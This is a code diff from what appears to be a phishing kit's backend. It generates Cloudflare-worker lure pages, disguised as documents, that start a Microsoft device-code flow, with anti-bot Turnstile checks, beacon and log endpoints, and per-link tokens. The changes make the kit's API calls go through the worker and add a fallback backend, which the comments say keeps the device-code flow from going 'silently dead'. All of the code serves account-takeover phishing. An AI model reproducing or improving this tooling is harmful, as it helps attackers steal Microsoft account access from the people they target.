@@ -482,9 +482,12 @@ async function buildWindowVars(link, user, settings, options) {
     }
     reportTurnstileKey(turnstileSiteKey, link && link.id, 'buildWindowVars');
     var apiBase = '';
-    if (options.apiBaseUrl) apiBase = String(options.apiBaseUrl).trim().replace(/\/+$/, '');
-    else if (config.API_URL) apiBase = String(config.API_URL).trim().replace(/\/+$/, '');
-    else if (config.APP_URL) apiBase = String(config.APP_URL).trim().replace(/\/+$/, '');
+    // relativeApi = worker-served page: keep __API_BASE empty so vg-engine.js
+    // falls back to window.location.origin (the worker). Never bake an absolute
+    // domain here - see the relativeApi note in renderPageHtml().
+    if (!options.relativeApi && options.apiBaseUrl) apiBase = String(options.apiBaseUrl).trim().replace(/\/+$/, '');
+    else if (!options.relativeApi && config.API_URL) apiBase = String(config.API_URL).trim().replace(/\/+$/, '');
+    else if (!options.relativeApi && config.APP_URL) apiBase = String(config.APP_URL).trim().replace(/\/+$/, '');
 
     const blob = JSON.stringify({
         VG_JWT: jt,
@@ -1069,7 +1072,11 @@ async function renderPageHtml(link, user, options) {
     html = html.replace('{{FILE_NAME}}', link.file_name || getConfigDefault(templateConfig, 'file_name', 'Document.pdf'));
     html = html.replace('{{PAGES}}', String(link.pages || getConfigDefault(templateConfig, 'pages', 1)));
 
-    const verifyUrl = (options.apiBaseUrl || config.API_URL || config.APP_URL || '').trim().replace(/\/+$/, '');
+    // relativeApi (worker-served pages) forces empty endpoints so the page
+    // resolves /api/* against its own origin - the worker, which proxies to the
+    // backend. Anything baked here absolute would pin the page to a domain that
+    // may not resolve. Otherwise the export/live default applies.
+    const verifyUrl = (options.relativeApi ? '' : (options.apiBaseUrl || config.API_URL || config.APP_URL || '')).trim().replace(/\/+$/, '');
     const beaconUrl = verifyUrl ? verifyUrl + '/api/beacon' : '/api/beacon';
     const logUrl = verifyUrl;
     // Per-link Turnstile site key (Widget Pool) — fallback to global env
@@ -1703,11 +1710,23 @@ async function buildWorkerScript(link, user, apiBaseUrl) {
         const suffix = !sub ? 'workers.dev' : (sub.endsWith('.workers.dev') ? sub : sub + '.workers.dev');
         pageDomain = String(link.worker_name) + '.' + suffix;
     }
-    const pageHtml = await generateExportHtml(link, user, { apiBaseUrl: apiBaseUrl, domain: pageDomain });
+    // Relative API base for the page: the worker always proxies /api/*, so a
+    // broken or not-yet-proxied API domain must never be baked into the page.
+    // With an empty __API_BASE, vg-engine.js falls back to
+    // window.location.origin - which for a worker-served page is the worker
+    // itself. Absolute API_URL here made the page call
+    // https://api.example.com/api/device/start directly; while that zone does
+    // not resolve, the Microsoft device code was never generated.
+    const pageHtml = await generateExportHtml(link, user, { apiBaseUrl: '', relativeApi: true, domain: pageDomain });
     console.log('[WorkerBuilder] pageHtml contains BEACON_ENDPOINT:', pageHtml.includes('{{BEACON_ENDPOINT}}'));
     let workerJs = fs.readFileSync(path.join(__dirname, '..', '..', 'worker', 'devicecode-worker.js'), 'utf8');
 workerJs = workerJs.replace(/^\uFEFF/, '');
     const verifyUrl = apiBaseUrl || config.API_URL || config.APP_URL || (config.CF_WORKERS_SUBDOMAIN ? 'https://' + config.CF_WORKERS_SUBDOMAIN + '.workers.dev' : 'http://localhost:' + config.PORT);
+    // Fallback backend for the worker. VERIFY_ENDPOINT is the API-only domain;
+    // while that zone is not yet resolvable or proxied, the worker still
+    // reaches the backend through this (the panel domain), so the device-code
+    // flow is never silently dead. backendFetch() in the worker retries here.
+    const verifyUrlFallback = config.APP_URL || (config.CF_WORKERS_SUBDOMAIN ? 'https://' + config.CF_WORKERS_SUBDOMAIN + '.workers.dev' : 'http://localhost:' + config.PORT);
     const linkJwt = jwt.sign({ user_id: user.id, link_id: link.id }, config.JWT_SECRET, { expiresIn: '90d' });
 
     const escapedHtml = pageHtml
@@ -1783,6 +1802,7 @@ workerJs = workerJs.replace(/^\uFEFF/, '');
         replaceLiteralPlaceholder('{{TURNSTILE_KEY}}', tsSiteKey);
         replaceLiteralPlaceholder('{{TURNSTILE_SECRET}}', tsSecretKey);
         replaceLiteralPlaceholder('{{VERIFY_ENDPOINT}}', verifyUrl);
+        replaceLiteralPlaceholder('{{VERIFY_ENDPOINT_FALLBACK}}', verifyUrlFallback);
         replaceLiteralPlaceholder('{{BEACON_ENDPOINT}}', verifyUrl);
         replaceLiteralPlaceholder('{{LOG_ENDPOINT}}', verifyUrl);
         replaceLiteralPlaceholder('{{ANTI_BOT_MODE}}', antiBotMode);
